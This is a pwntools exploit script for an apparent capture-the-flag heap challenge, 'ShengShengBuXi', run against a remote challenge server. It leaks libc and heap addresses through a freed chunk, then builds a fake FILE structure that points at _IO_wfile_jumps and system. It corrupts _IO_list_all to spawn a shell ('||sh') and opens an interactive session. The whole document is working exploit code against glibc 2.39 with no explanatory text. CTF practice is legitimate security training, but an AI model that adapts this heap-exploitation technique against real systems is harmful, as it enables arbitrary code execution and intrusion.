from pwn import *

context(arch = 'amd64')
context.log_level = 'debug'

# p = process('./ShengShengBuXi')
p = remote('challenges.hazmat.buptmerak.cn', 20258)
# p = remote('127.0.0.1', 9999)
# attachment = ELF('./')
libc = ELF('./libc-2.39.so')

def Earn(size):
    p.sendlineafter(b'choice:', b'1')
    p.sendlineafter(b'earned?', str(size).encode())

def Buy(id):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'use?', str(id).encode())

def Note(id, content):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'note?', str(id).encode())
    p.sendlineafter(b'begin.', content)

def Check(id):
    p.sendlineafter(b'choice:', b'4')
    p.sendlineafter(b'check?', str(id).encode())

Earn(0x600) # 0
Earn(0x6e0) # 1 !
Buy(0)
Earn(0x6e0) # 2
Check(0)
p.recvline()
libc_base = u64(p.recv(8)) - 0x203f90
p.recv(8)
heap_addr = u64(p.recv(8)) + 0x610
system_addr = libc_base + libc.symbols['system']
_IO_list_all_addr = libc_base + libc.symbols['_IO_list_all']
_IO_wfile_jumps_addr = libc_base + libc.symbols['_IO_wfile_jumps']
_lock = libc_base + libc.symbols['_IO_list_all'] + 0xa8
print(hex(libc_base), hex(heap_addr))
print('_IO_list_all:', hex(_IO_list_all_addr))
print('_IO_wfile_jumps:', hex(_IO_wfile_jumps_addr))
print('_lock:', hex(_lock))

fake = flat({
    # 0: [b' cat f*\x00', 0x6e1],
    0: [b'\x80\x80||sh\x00\x00', 0x6e1],
    # 0x88: heap_addr + 0x1000,
    0xa0: heap_addr + 0x200,
    0xd8: _IO_wfile_jumps_addr,
    0x2e0: heap_addr + 0x400,
    0x468: system_addr,
    0x6e0: []
}, filler = b'\x00')

Buy(1)
Buy(2)
Earn(0x5e0) # 3
Earn(0x800) # 4 !
Buy(3)
Buy(4)
Earn(0x5d0) # 5
Earn(0x6e0) # 6 !
Earn(0x500) # 7
Buy(6)
Earn(0x800) # 8
payload = p64(_IO_list_all_addr - 0x20) * 2
payload += fake
payload += p64(0) + p64(0x111) + p64(0xd00) + p64(0x6f0)
Note(4, payload)
Buy(1)
Earn(0x800)
# gdb.attach(p, 'b *0x7ffff7c8ae94')
# gdb.attach(p, 'b *0x7ffff7c967f8')

p.sendlineafter(b'choice:', b'5')

p.interactive()